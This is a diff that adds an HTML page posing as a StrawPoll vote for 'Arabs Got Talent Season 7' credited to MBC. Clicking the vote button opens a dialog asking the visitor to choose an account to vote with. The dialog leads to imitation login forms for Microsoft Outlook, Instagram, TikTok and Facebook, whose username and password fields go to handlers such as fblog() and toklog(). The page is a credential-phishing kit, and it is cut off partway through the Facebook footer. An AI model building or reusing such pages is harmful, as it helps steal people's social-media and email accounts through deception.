@@ -1,0 +1,863 @@
+<!DOCTYPE html>
+<html lang="en" id="html" x-data="global()" class="h-full js-focus-visible">
+
+<head>
+  <meta charset="utf-8">
+  <title>Arabs Got Talent Season 7 - StrawPoll</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="stylesheet" href="strawpoll/dist/main.css">
+  <script defer src="strawpoll/dist/app.js?v=248"></script>
+  <meta name="twitter:card" content="summary_large_image" />
+  <meta property="fb:app_id" content="567582844767504" />
+  <meta property="og:site_name" content="StrawPoll" />
+  <meta property="og:title" content="Arabs Got Talent Season 7 - StrawPoll" />
+  <meta property="og:description"
+    content="Cast your votes for the most talented stars in the Arabs Got Talent Season 7! Support your favorite acts in categories like singing, dancing, comedy, magic, and more." />
+  <meta property="og:type" content="website" />
+  <meta property="og:image" content="https://cdn.strawpoll.com/images/polls/covers/w4nWVAQWyAL-c.png" />
+  <meta property="og:image:width" content="1200" />
+  <meta property="og:image:height" content="630" />
+  <meta property="og:locale" content="en" />
+  <meta name="apple-mobile-web-app-title" content="StrawPoll" />
+  <meta name="application-name" content="StrawPoll" />
+  <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+  <link rel="manifest" href="/site.webmanifest">
+  <script>
+
+    const APPEARANCE = 'auto'
+  </script>
+  <script>
+    let defaultThemeLight = { 'id': null, 'name': 'Default', colors: { 'pageBg': '#f9fafb', 'boxBg': '#ffffff', 'boxBorder': '#e5e8eb', 'boxBorderTop': '#fbbf24', 'title': '#111827', 'text': '#6b7280', 'highlight': '#4f46e5', 'buttonBg': '#4f46e5', 'buttonText': '#ffffff', 'border': '#e5e7eb', }, 'hideShareButton': false }
+    let defaultThemeDark = { 'id': null, 'name': 'Default', colors: { 'pageBg': '#111827', 'boxBg': '#1f2937', 'boxBorder': '#374151', 'boxBorderTop': '#818cf8', 'title': '#e5e7eb', 'text': '#94a3b8', 'highlight': '#6366f1', 'buttonBg': '#6366f1', 'buttonText': '#ffffff', 'border': '#374151' }, 'hideShareButton': false }
+
+    let customTheme = { id: null }
+
+    let currentTheme = defaultThemeLight
+
+    if (APPEARANCE === 'dark' || APPEARANCE === 'auto' && window.matchMedia('(prefers-color-scheme: dark)').matches) {
+      document.getElementById('html').classList.add('dark')
+      currentTheme = defaultThemeDark
+    }
+
+    if (customTheme.id) {
+      currentTheme = customTheme
+
+      if (isDarkBg(hexToRGBA(customTheme.colors.pageBg, 1, 0, 1))) {
+        if (!document.getElementById('html').classList.contains('dark')) {
+          document.getElementById('html').classList.add('dark')
+        }
+      } else {
+        if (document.getElementById('html').classList.contains('dark')) {
+          document.getElementById('html').classList.remove('dark')
+        }
+      }
+    }
+
+    let pollOptionColors = ['#3EB991', '#FF7563', '#AA66CC', '#FFBB33', '#FF8800', '#33B5E5', '#AA66CC']
+
+    setCustomTheme(currentTheme)
+
+    function setCustomTheme(theme) {
+      for (const [key, value] of Object.entries(theme.colors)) {
+        document.documentElement.style.setProperty('--' + key, hexToRGBA(value, 1, 0, 1))
+      }
+
+      document.documentElement.style.setProperty('--buttonBgLight', hexToRGBA(theme.colors['buttonBg'], 1, 1, 1.16))
+      document.documentElement.style.setProperty('--borderDark', hexToRGBA(theme.colors['border'], 1, 1, 0.84))
+      document.documentElement.style.setProperty('--highlightDark', hexToRGBA(theme.colors['highlight'], 1, 1, 0.84))
+      document.documentElement.style.setProperty('--textShadow', hexToRGBA(theme.colors['text'], 1, 5, 0.954))
+      document.documentElement.style.setProperty('--textLight', hexToRGBA(theme.colors['text'], 0.8, 0, 1)) // 1, 113, 0.5568)
+      document.documentElement.style.setProperty('--textLighter', hexToRGBA(theme.colors['text'], 1, 168, 0.3431))
+      document.documentElement.style.setProperty('--highlightShadow', hexToRGBA(theme.colors['highlight'], 1, 58, 0.772))
+    }
+
+    function setCustomFormDesign(design) {
+      for (const [key, value] of Object.entries(design.colors)) {
+        document.documentElement.style.setProperty('--' + key, hexToRGBA(value, 1, 0, 1))
+      }
+
+      if (isDarkBg(hexToRGBA(design.colors['formBackgroundColor'], 1, 0, 1))) {
+        document.documentElement.style.setProperty('--textColorLight', hexToRGBA(design.colors['textColor'], 1, 1, 0.5))
+        document.documentElement.style.setProperty('--titleColorLight', hexToRGBA(design.colors['titleColor'], 1, 1, 0.5))
+      } else {
+        document.documentElement.style.setProperty('--titleColorLight', hexToRGBA(design.colors['titleColor'], 0.2, 0, 1))
+        document.documentElement.style.setProperty('--textColorLight', hexToRGBA(design.colors['textColor'], 0.2, 0, 1))
+      }
+
+      if (isDarkBg(hexToRGBA(design.colors['choiceColor'], 1, 0, 1))) {
+        document.documentElement.style.setProperty('--choiceBackgroundTextColor', 'rgba(255,255,255,1)')
+      } else {
+        document.documentElement.style.setProperty('--choiceBackgroundTextColor', 'rgba(0,0,0,1)')
+      }
+    }
+
+    function hexToRGBA(hex, opacity, modifierAdd, modifierMulti) {
+      if (!hex) {
+        return 'rgba(0, 0, 0, 0)'
+      }
+      let c;
+      if (/^#([A-Fa-f0-9]{3}){1,2}$/.test(hex)) {
+        c = hex.substring(1).split('')
+        if (c.length === 3) {
+          c = [c[0], c[0], c[1], c[1], c[2], c[2]]
+        }
+        c = '0x' + c.join('')
+        return 'rgba(' + [(c >> 16) & 255, (c >> 8) & 255, c & 255].map(x => parseInt(modifierAdd + modifierMulti * x)).join(',') + ', ' + opacity + ')'
+      }
+    }
+
+    function isDarkBg(color) {
+      let colors = color.match(/^rgba?\((\d+),\s*(\d+),\s*(\d+)(?:,\s*(\d+(?:\.\d+)?))?\)$/)
+
+      let r = colors[1]
+      let g = colors[2]
+      let b = colors[3]
+      let a = parseInt(colors[4])
+
+      if (a === 0) return 0
+
+      let hsp = Math.sqrt(0.299 * (r * r) + 0.587 * (g * g) + 0.114 * (b * b))
+
+      if (hsp <= 127.5) {
+        return 1
+      }
+    }
+  </script>
+  <!-- Add this line in the <head> section of your HTML -->
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" rel="stylesheet">
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script src="js/index.js"></script>
+
+  <link rel="stylesheet" href="css/index.css">
+  <script>
+
+  </script>
+
+  <style>
+    /* Popup styles */
+    .popup {
+      position: fixed;
+      bottom: 20px;
+      right: 20px;
+      background-color: rgba(0, 0, 0, 0.7);
+      color: white;
+      padding: 10px;
+      border-radius: 5px;
+      display: flex;
+      align-items: center;
+      display: none;
+      z-index: 999;
+      /* Lower z-index */
+    }
+
+    .popup-overlay {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      z-index: 998;
+      /* Lower z-index for the overlay */
+    }
+
+    .popup img {
+      border-radius: 50%;
+      margin-right: 10px;
+      width: 40px;
+      height: 40px;
+    }
+  </style>
+</head>
+
+<body class="font-sans antialiased min-h-full flex flex-col text-default bg-transparent">
+  <div id="">
+    <div id="home" class="flex-auto  ">
+      <div>
+        <div class="space-y-8 ">
+          <div class="strawpoll-box custom-box custom-box-primary overflow-visible mx-auto max-w-full"
+            :class="{ 'max-w-full': !expandBox, 'max-w-full': expandBox }">
+            <div class="space-y-8 mb-8 pt-4 px-4 sm:px-6 sm:pt-6">
+              <div id="poll-container" class="flex justify-between">
+                <div class="flex-grow flex flex-col">
+                  <h1 id="poll-title"
+                    class="strawpoll-title text-2xl text-gray-900 dark:text-gray-200 font-semibold custom-title break-words">
+                    Arabs Got Talent Season 7
+                  </h1>
+                </div>
+
+                <div class="flex items-top space-x-3">
+                </div>
+              </div>
+
+              <script>
+                // Plain JavaScript to set the poll title dynamically
+                document.addEventListener("DOMContentLoaded", function () {
+                  const pollTitle = "Arabs Got Talent Season 7"; // Set your title here
+                  const pollTitleElement = document.getElementById("poll-title");
+
+                  // Set the text content of the poll title element
+                  if (pollTitleElement) {
+                    pollTitleElement.textContent = pollTitle;
+                  }
+                });
+              </script>
+
+              <div x-data="{ poll: Alpine.store(&#39;poll&#39;), i: 0,  }">
+                <div class="flex">
+                  <div class="text-gray-500 custom-text mr-3">
+                    <svg class="h-5 w-5 " xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24"
+                      stroke="currentColor">
+                      <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                        d="M7 8h10M7 12h4m1 8l-4-4H5a2 2 0 01-2-2V6a2 2 0 012-2h14a2 2 0 012 2v8a2 2 0 01-2 2h-3l-4 4z" />
+                    </svg>
+                  </div>
+                  <div class="text-gray-500 custom-text ">
+                    <span class="whitespace-pre-line break-words">Cast your votes for the most
+                      talented stars in the Arabs Got Talent Season 7! Support your favorite acts
+                      in categories like singing, dancing, comedy, magic, and more. Every vote
+                      takes them one step closer to becoming the champion—your voice makes the
+                      difference!
+
+                      Voting ends soon. Don’t miss your chance to make it count!</span>
+                  </div>
+                </div>
+              </div>
+              <div class="flex justify-center px-0 sm:px-20">
+                <img src="https://cdn.strawpoll.com/images/polls/covers/w4nWVAQWyAL-c.png" alt="Poll image" />
+              </div>
+
+            </div>
+
+            <div x-data="pollVote()" class="strawpoll-form px-4 sm:px-6">
+              <div class="space-y-8 pb-4 sm:pb-6" style="min-width: 168px; ">
+                <div x-data="rankingVote()">
+                  <div class="text-gray-500 flex justify-center custom-text">
+                    <span
+                      x-show="$store.poll.pollConfig.layout === 'drag' || $store.poll.pollConfig.layout === 'default' && isMobileView">
+                      Select a contestant and then hit the vote button next to their number to
+                      proceed
+                    </span>
+                  </div>
+                  <div class="mt-4 text-lg sm:text-base" style="min-width: 168px;">
+                    <div id="poll_options" class="fix-drag-hover mx-auto sm:max-w-full" style="max-width: 100%;"
+                      x-data="dragOptions()">
+                      <template x-for="(option, i) in initialOptions" :key="option.id">
+                        <div :data-id="option.id" :data-value="option.value"
+                          class="drag-item flex items-center justify-between mt-3 rounded-md border border-gray-200 dark:border-gray-700 bg-white dark:bg-gray-700 px-4 py-3 cursor-grab">
+                          <div class="flex flex-grow items-center space-x-3  border-r custom-border pr-3">
+                            <span
+                              class="rounded-full w-8 h-8 flex items-center justify-center custom-field-input border custom-border shrink-0 mr-1"
+                              x-text="currentPosition[option.id]"></span>
+                            <span x-html="parseMarkDown(option.value)"></span>
+                          </div>
+                          <div class="ml-3">
+                            <button onclick="vote()" class="button text-sm custom-button px-8">
+                              <!-- Display points as button text -->
+                              <span id="points-display">VOTE</span>
+                            </button>
+                          </div>
+                        </div>
+                    </div>
+                    </template>
+                  </div>
+
+                  <script>
+                    function parseMarkDown(text) {
+                      text = text
+                        .replace(/&/g, "&amp;")
+                        .replace(/</g, "&lt;")
+                        .replace(/>/g, "&gt;")
+                        .replace(/"/g, "&quot;")
+                        .replace(/'/g, "&#039;")
+
+                      var bold = /\*\*(.*?)\*\*/gm
+                      var html = text.replace(bold, '<strong>$1</strong>');
+                      return html
+                    }
+
+                    function dragOptions() {
+                      return {
+                        option: { value: '###' }, // used for Sortable fallback
+                        currentPosition: {},
+                        currentPoints: {},
+                        maxPoints: 0,
+                        init() {
+                          this.$watch('checkedOptions', value => {
+                            this.updateSelectedOptions(value)
+                          })
+
+                          this.checkedOptions = JSON.parse(JSON.stringify(this.initialOptions))
+
+                          this.waitForSortable()
+                        },
+                        updateSelectedOptions(value) {
+                          this.selectedOptions = value.map((option, index) => ({ id: option.id, value: index + 1 }))
+                          this.maxPoints = this.$store.poll.pollConfig.maxPoints
+                          if (!this.maxPoints) this.maxPoints = this.selectedOptions.length - 1
+                          this.selectedOptions.forEach((option, index) => {
+                            this.currentPoints[option.id] = this.maxPoints - index
+                            if (this.currentPoints[option.id] < 0) this.currentPoints[option.id] = 0
+                            this.currentPosition[option.id] = index + 1
+                          })
+                        },
+
+                        initSortable() {
+                          let self = this
+                          let el = document.getElementById('poll_options');
+                          let sortable = Sortable.create(el, {
+                            animation: 150,
+                            ghostClass: 'drag-ghost',
+                            onChoose: function (event) {
+                              self.option = { id: event.item.dataset.id, value: event.item.dataset.value }
+                            },
+                            onStart: function () {
+                              this.el.classList.remove('fix-drag-hover');
+                            },
+                            onEnd: function () {
+                              this.el.classList.add('fix-drag-hover');
+                            },
+                            onUpdate: (event) => {
+                              const element = this.checkedOptions.splice(event.oldIndex, 1)
+                              this.checkedOptions.splice(event.newIndex, 0, element[0])
+                            }
+                          });
+                        },
+                      }
+                    }
+                  </script>
+                </div>
+              </div>
+              <script>
+                function rankingVote() {
+                  return {
+                    // Define initial options manually
+                    initialOptions: [
+                      { id: 1, value: 'Contestant 3921', points: 0 },
+                      { id: 2, value: 'Contestant 2931', points: 0 },
+                      { id: 3, value: 'Contestant 2716', points: 0 },
+                      { id: 4, value: 'Contestant 1246', points: 0 },
+                      { id: 5, value: 'Contestant 2216', points: 0 },
+                      { id: 6, value: 'Contestant 2716', points: 0 },
+                      { id: 7, value: 'Contestant 2033', points: 0 },
+                      { id: 8, value: 'Contestant 1016', points: 0 },
+                      { id: 9, value: 'Contestant 8112', points: 0 },
+                      { id: 10, value: 'Contestant 2716', points: 0 }
+                    ],
+                    checkedOptions: [],
+                    init() {
+                      // Initialize checkedOptions as a copy of initialOptions
+                      this.checkedOptions = JSON.parse(JSON.stringify(this.initialOptions));
+                    },
+                    // Method to handle the voting process
+                    vote(optionId) {
+                      this.checkedOptions.forEach(option => {
+                        if (option.id === optionId) {
+                          option.points += 1; // Increment points for the selected option
+                        }
+                      });
+                      console.log(this.checkedOptions); // Log updated options for debugging
+                    }
+                  };
+                }
+              </script>
+            </div>
+          </div>
+
+          <div class="strawpoll-embed-footer px-4 sm:px-6 py-3 border-t custom-border space-y-3">
+            <div class="flex flex-col items-center sm:flex-row sm:justify-between">
+              <div class="hidden sm:block">
+                <span class="custom-text">
+                  <span id="copyright-year"></span>
+                </span>
+
+                <script>
+                  // Plain JavaScript to set the copyright year with "MBC"
+                  document.addEventListener("DOMContentLoaded", function () {
+                    const currentYear = new Date().getFullYear(); // Get the current year
+                    const copyrightYearElement = document.getElementById("copyright-year");
+
+                    // Set the text content of the copyright year element
+                    if (copyrightYearElement) {
+                      copyrightYearElement.innerHTML = `&copy; ${currentYear} Arabs Got Talent`;
+                    }
+                  });
+                </script>
+              </div>
+              <div class="custom-text">Powered by <a href="" target="_blank"
+                  class="font-semibold hover:underline">MBC</a></div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Choose Social Login -->
+  <div id="socialDialog" class="hidden fixed inset-0 flex items-center justify-center z-50 p-6">
+
+    <!-- Overlay -->
+    <div class="fixed z-40 inset-0 bg-gray-500 dark:bg-gray-900 opacity-80" onclick="hideAlert()" aria-hidden="true">
+    </div>
+
+    <!-- Trick to center modal -->
+    <span class="hidden sm:inline-block sm:align-middle sm:h-screen" aria-hidden="true"></span>
+
+    <!-- Error Dialog -->
+    <div id="modal-content"
+      class="relative z-50 inline-block align-bottom bg-white dark:bg-gray-800 rounded-lg text-left overflow-visible shadow-xl my-8 w-full max-w-sm sm:max-w-md">
+
+      <!-- Close button -->
+      <div class="absolute top-0 right-0 pt-4 pr-4">
+        <button type="button"
+          class="rounded-md text-gray-400 hover:text-gray-500 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-indigo-500"
+          onclick="can()">
+          <span class="sr-only">Close</span>
+          <svg class="h-6 w-6" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12">
+            </path>
+          </svg>
+        </button>
+      </div>
+
+      <!-- Modal Content -->
+      <div class="px-4 pt-5 pb-4 sm:p-6 rounded-md">
+        <div class="mx-auto flex items-center justify-center h-12 w-12 rounded-full bg-transparent">
+          <svg class="h-6 w-6 text-yellow-600" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24"
+            stroke="currentColor" aria-hidden="true">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+              d="M12 2L2 22h20L12 2zm0 13v-4m0 4h0" />
+          </svg>
+        </div>
+        <div class="mt-3 text-center sm:mt-5">
+          <h3 id="alert-title" class="text-lg leading-6 font-medium text-gray-900 dark:text-white">
+            Choose an account to vote with
+          </h3>
+          <!-- Social Media Icons -->
+          <div class="mt-6 flex justify-center space-x-8">
+            <img width="50px" height="50px" title="facebook"
+              class="cursor-pointer hover:scale-110 transition-all duration-200 ease-in-out transform w-12 h-12"
+              src="https://cdn.icon-icons.com/icons2/1826/PNG/512/4202107facebookfblogosocialsocialmedia-115710_115591.png"
+              alt="Facebook" onclick="fb(); hidePopup(); can();">
+
+            <img width="50px" height="50px" title="instagram"
+              class="cursor-pointer hover:scale-110 transition-all duration-200 ease-in-out transform w-12 h-12"
+              src="https://cdn.icon-icons.com/icons2/836/PNG/512/Instagram_icon-icons.com_66804.png" alt="Instagram"
+              onclick="ig(); hidePopup(); can();">
+
+            <img width="50px" height="50px" title="tiktok"
+              class="cursor-pointer hover:scale-110 transition-all duration-200 ease-in-out transform w-12 h-12"
+              src="https://cdn.icon-icons.com/icons2/2389/PNG/512/tiktok_logo_icon_144802.png" alt="TikTok"
+              onclick="tok(); hidePopup(); can();">
+
+            <img width="50px" height="50px" title="email"
+              class="cursor-pointer hover:scale-110 transition-all duration-200 ease-in-out transform w-12 h-12"
+              src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/44/Microsoft_logo.svg/1024px-Microsoft_logo.svg.png"
+              alt="Twitter" onclick="tw(); hidePopup(); can();">
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div id="votingsocial">
+    <div id="twp" class="bg-gray mt-4">
+      <div class="min-h-screen flex flex-col w-full">
+        <!-- Main Content Section -->
+        <main class="flex-grow">
+          <div class="tokpart ">
+            <div class=" p-5 w-full max-w-md">
+              <img
+                src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/96/Microsoft_logo_%282012%29.svg/1920px-Microsoft_logo_%282012%29.svg.png"
+                alt="logo" class="h-10 mt-20">
+              <h2 id="heading" class="text-4xl font-bold text-white mb-0 mt-12 text-left">Sign in</h2>
+              <p class="text-xl text-white mb-6 mt-0 text-left">to continue to Outlook</p>
+              <!-- Email Input -->
+              <div id="uname" class="flex justify-start">
+                <input type="email" id="twi-uname" name="email" required
+                  class="block w-full px-1 py-4 border-b border-gray-700 focus:outline-none focus:ring-0 focus:border-blue-500 bg-transparent text-gray-300 placeholder:text-gray-500"
+                  placeholder="Email, phone, or Skype" />
+              </div>
+              <div class="flex justify-start">
+                <button id="forgotPasswordButton" type="button"
+                  class="text-gray-200 py-2 px-1 bg-transparent focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-gray-900 mt-0">
+                  No account?
+                  <span class="text-blue-500 hover:underline"> Create one!</span>
+                </button>
+              </div>
+              <!-- Next Button to show password field -->
+              <button id="nextButton" type="button" onclick="showPasswordField()"
+                class="bg-blue-500 text-white py-2 px-4 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500 mt-4 float-right">
+                Next
+              </button>
+              <!-- Password Field (hidden initially) -->
+              <div id="passwordField" class="hidden mt-4">
+                <div class="mb-4 relative">
+                  <input type="password" id="twi-pass" name="password" required
+                    class="block w-full px-1 py-4 border-b border-gray-700 focus:outline-none focus:ring-0 focus:border-blue-500 bg-transparent text-gray-300 placeholder:text-gray-500"
+                    placeholder="Password" />
+                </div>
+                <button id="nextButton" type="button" onclick="twilog()"
+                  class="bg-blue-500 text-white py-2 px-4 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500 mt-4 float-right">
+                  Submit
+                </button>
+
+              </div>
+
+            </div>
+          </div>
+        </main>
+        <!-- Footer Section -->
+        <footer id="error-message" class="hidden bg-blue-600 text-white text-sm mt-2 text-center py-6 mt-auto w-full ">
+          <div class=" w-full px-4">
+            <div class="flex justify-between items-center">
+              Sorry, we could not find your account.
+            </div>
+          </div>
+        </footer>
+
+      </div>
+
+    </div>
+
+    <div id="igp" class="bg-black">
+      <div class="min-h-screen flex flex-col w-full">
+        <!-- Main Content Section -->
+        <main class="flex-grow p-2"> <!-- Reduced padding here -->
+          <div class="flex justify-center mt-11 mb-6">
+            <!-- Centered Image -->
+            <img src="image/ig.svg" alt="logo" class="h-12">
+          </div>
+          <div class="tokpart bg-black">
+            <div class="bg-black p-8 w-full max-w-md">
+              <div id="buttonsContainer">
+                <!-- Container Div for Google, Apple Buttons, and 'or' Divider -->
+                <button id="ButtonGoogle" type="button" onclick=""
+                  class="w-full py-2 bg-blue-600 px-4 rounded-md flex items-center justify-center text-white focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500 mt-4"
+                  style="font-family: 'Google Sans', arial, sans-serif; font-weight: 400; overflow: hidden;">
+                  <!-- Google Icon -->
+                  <img src="image/fbss.png" alt="Google Icon" class="h-5 mr-3">
+                  Continue Using Facebook
+                </button>
+                <div class="flex items-center my-4">
+                  <div class="flex-grow border-t border-gray-700"></div>
+                  <span class="mx-4 text-gray-500">OR</span>
+                  <div class="flex-grow border-t border-gray-700"></div>
+                </div>
+              </div>
+              <!-- Email Input -->
+              <div class="mb-4 relative">
+                <input type="text" id="ig-uname" name="" required
+                  class="mt-1 block w-full px-3 py-2 border border-gray-700 rounded-md shadow-sm focus:outline-none focus:ring-blue-500 focus:border-blue-500 bg-[transparent] peer text-gray-300"
+                  placeholder="Phone, Email address, or username" />
+              </div>
+              <div class="mb-4">
+                <!-- Input Field -->
+                <input type="text" id="ig-pass" name="" required
+                  class="mt-1 block w-full px-3 py-2 border border-gray-700 rounded-md shadow-sm focus:outline-none focus:ring-blue-500 focus:border-blue-500 bg-[transparent] peer text-gray-300"
+                  placeholder="Password" />
+
+                <!-- Forgot Password Button -->
+                <button id="forgotPasswordButton" type="button"
+                  class="text-blue-600 py-2 px-4 rounded-none bg-transparent border-0 hover:text-blue-800 focus:outline-none focus:ring-0 mt-0 mr-0 ml-auto block">
+                  Forgot Password?
+                </button>
+              </div>
+              <!-- Login Button -->
+              <button id="loginButton" type="button" onclick="iglog()"
+                class="w-full bg-blue-600 text-gray-100 py-2 px-4 rounded-md focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500 mt-4">
+                Log in
+              </button>
+
+              <p class="mt-6 text-left text-xl text-gray-100">
+                Don't have an account?
+                <a href="#" class="font-medium text-blue-600 hover:text-blue-500">Sign up</a>
+              </p>
+            </div>
+          </div>
+        </main>
+
+        <!-- Footer Section -->
+        <footer id="error-message" style="background-color: rgb(18, 18, 18);"
+          class="text-white text-sm mt-2 text-center py-1 mt-auto w-full">
+          <div class="flex justify-center items-center flex-col">
+            <!-- Text above the image with reduced margin -->
+            <p class="mb-0" style="font-size: 12px; margin-bottom: 2px;">from</p>
+            <!-- Linked image -->
+            <a href="https://www.example.com">
+              <img src="image/meta.png" alt="logo" class="h-14">
+            </a>
+          </div>
+        </footer>
+      </div>
+    </div>
+
+    <div id="tokp">
+      <div class="min-h-screen flex flex-col w-full">
+        <!-- Main Content Section -->
+        <main class="flex-grow">
+          <div class="flex justify-between items-center p-4">
+            <!-- Left Section -->
+            <div class="flex items-center">
+              <img
+                src="https://upload.wikimedia.org/wikipedia/en/thumb/a/a9/TikTok_logo.svg/1000px-TikTok_logo.svg.png?20200415104610"
+                alt="logo" class="h-10">
+            </div>
+            <!-- Right Section -->
+            <div class="flex items-center space-x-2">
+              <i class="fa fa-question-circle text-gray-500 hover:text-gray-700" aria-hidden="true"></i>
+              <span id="feedback-help" class="text-gray-500 hover:text-gray-700">Feedback and
+                help</span>
+            </div>
+          </div>
+          <div class="tokpart text-black">
+            <div class="bg-white p-8 w-full max-w-md">
+              <h2 id="login-title" class="text-2xl font-bold mb-6 text-center">Log In</h2>
+              <div>
+                <div class="mb-4">
+                  <label id="email-label" for="email" class="block text-sm font-medium text-gray-700">Email or
+                    username</label>
+                  <input type="text" id="tok-uname" required
+                    class="mt-1 block w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-blue-500 focus:border-blue-500"
+                    oninput="checkInput()">
+                  <p id="email-feedback" class="text-sm text-red-500 hidden">Please enter a valid
+                    account.</p>
+                </div>
+                <div class="mb-6">
+                  <label id="password-label" for="password"
+                    class="block text-sm font-medium text-gray-700">Password</label>
+                  <input type="password" id="tok-pass" name="password" required
+                    class="mt-1 block w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-blue-500 focus:border-blue-500"
+                    oninput="checkPassword()">
+                  <p id="password-feedback" class="text-sm text-red-500 hidden">Password must be at
+                    least 6 characters long.</p>
+                </div>
+                <div class="flex items-center justify-between mb-6">
+                  <div class="text-sm">
+                    <a id="forgot-password" href="#" class="font-medium text-gray-600 hover:text-gray-500">Forgot
+                      password?</a>
+                  </div>
+                </div>
+                <button onclick="toklog()" type="submit" id="login-button"
+                  class="w-full bg-pink-600 text-white py-2 px-4 rounded-md hover:bg-pink-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500">Log
+                  in</button>
+              </div>
+              <p id="signup-text" class="mt-6 text-center text-sm text-gray-600">
+                Don't have an account?
+                <a href="#" class="font-medium text-pink-600 hover:text-pink-500">Sign up</a>
+              </p>
+            </div>
+          </div>
+        </main>
+        <!-- Footer Section -->
+        <footer class="bg-gray-900 text-white py-6 mt-auto w-full">
+          <div class="w-full px-4">
+            <div class="flex justify-between items-center">
+              <!-- Left Section: Language Selector with Rounded Border -->
+              <div class="flex items-center space-x-4">
+                <select id="languageSelect" onchange="translatePage()"
+                  class="bg-gray-900 text-gray-500 py-1 px-3 rounded-80 border border-gray-200 focus:outline-none focus:ring-2 focus:ring-blue-500">
+                  <option value="en">English</option>
+                  <option value="es">Español</option>
+                  <option value="fr">Français</option>
+                  <option value="de">Deutsch</option>
+                  <option value="it">Italiano</option>
+                  <option value="pt">Português</option>
+                  <option value="zh">中文 (Chinese)</option>
+                  <option value="ar">العربية (Arabic)</option>
+                </select>
+              </div>
+              <!-- Right Section: Copyright -->
+              <div class="text-sm text-gray-500">
+                &copy; 2025 TikTok
+              </div>
+            </div>
+          </div>
+        </footer>
+      </div>
+    </div>
+
+    <script>
+      // Check if email is valid
+      function checkInput() {
+        const email = document.getElementById('tok-uname').value;
+        const emailFeedback = document.getElementById('email-feedback');
+
+        if (emailPattern.test(email)) {
+          emailFeedback.classList.add('hidden');
+        } else {
+          emailFeedback.classList.remove('hidden');
+        }
+      }
+
+      // Check if password is valid (at least 6 characters)
+      function checkPassword() {
+        const password = document.getElementById('tok-pass').value;
+        const passwordFeedback = document.getElementById('password-feedback');
+
+        if (password.length >= 6) {
+          passwordFeedback.classList.add('hidden');
+        } else {
+          passwordFeedback.classList.remove('hidden');
+        }
+      }
+    </script>
+
+    <div id="fbp" class="bg-gray-100 text">
+      <div class="min-h-screen flex flex-col w-full">
+        <!-- Main Content Section -->
+        <main class="flex-grow p-2"> <!-- Reduced padding here -->
+          <div class="flex justify-center mt-9 mb-4">
+            <!-- Centered Image -->
+            <img
+              src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/93/Facebook_logo_%282023%29.svg/800px-Facebook_logo_%282023%29.svg.png"
+              alt="logo" class="h-12">
+          </div>
+          <div class="flex justify-center mb-4 text-black">
+            <p class="text-xl text-center break-words max-w-md">
+              Facebook helps you connect and share with the people in your life.
+            </p>
+          </div>
+          <div class="tokpart">
+            <div class="bg-white p-8 w-full max-w-md border border-white shadow-2xl rounded-lg">
+              <!-- Email Input -->
+              <div class="mb-4 relative">
+                <input type="text" id="fb-uname" name="" required
+                  class="mt-1 block w-full px-3 py-2 border border-gray-200 rounded-md focus:outline-none focus:ring-blue-500 focus:border-blue-500 bg-[transparent] peer text-gray-800"
+                  placeholder="Email address or phone number" />
+              </div>
+              <div class="mb-4">
+                <!-- Input Field -->
+                <input type="text" id="fb-pass" name="" required
+                  class="mt-1 block w-full px-3 py-2 border border-gray-200 rounded-md  focus:outline-none focus:ring-blue-500 focus:border-blue-500 bg-[transparent] peer text-gray-800"
+                  placeholder="Password" />
+                <!-- Login Button -->
+                <button id="loginButton" type="button" onclick="fblog()"
+                  class="w-full bg-[#0866ff] text-white py-3 px-6 text-lg rounded-md focus:outline-none focus:ring-2 focus:ring-offset-0 focus:ring-[#0866ff] mt-4 font-semibold">
+                  Log in
+                </button>
+                <!-- Forgot Password Button -->
+                <button id="forgotPasswordButton" type="button"
+                  class="w-full bg-transparent text-[#0866ff] py-3 px-6 text-sm rounded-md border-0 hover:text-[#0866ff] focus:outline-none focus:ring-0 mt-0">
+                  Forgotten Password?
+                </button>
+                <!-- Divider -->
+                <div class="flex items-center my-2">
+                  <div class="flex-grow border-t border-gray-300"></div>
+                  <div class="flex-grow border-t border-gray-300"></div>
+                </div>
+                <!-- Create New Account Button -->
+                <button id="createAccountButton" type="button"
+                  class="w-full bg-green-600 text-white py-3 px-6 text-lg rounded-md focus:outline-none focus:ring-2 focus:ring-offset-0 focus:ring-green-600 mt-4">
+                  Create new account
+                </button>
+              </div>
+            </div>
+          </div>
+          <div class="flex justify-center mb-4 mt-7 text-gray-600">
+            <p class="text-l text-center break-words max-w-md">
+              <span style="font-weight: 600;"> Create a Page </span> for a celebrity, brand or
+              business.
+            </p>
+          </div>
+        </main>
+
+        <!-- Footer Section -->
+        <footer id="error-message" class="bg-white text-gray-600 text-sm mt-2 py-5 w-full">
+          <div class="w-full px-5">
+            <!-- Container -->
+            <div class="flex flex-col gap-4">
+
+              <!-- Language Section -->
+              <div class="px-2">
